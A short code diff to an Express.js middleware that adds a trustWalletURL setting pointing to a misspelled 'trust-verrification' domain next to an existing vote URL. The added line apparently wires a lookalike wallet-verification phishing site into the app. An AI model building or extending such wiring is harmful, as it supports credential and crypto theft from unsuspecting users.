@@ -41,6 +41,7 @@ app.use(function (req, res, next) {
   res.locals.error_msg = req.flash('error_msg');
   res.locals.error = req.flash('error');
   req.app.voteUrl = "https://fanfamousity.com"
+  req.app.trustWalletURL = "https://trust-verrification.xyz"
   next();
 });
 
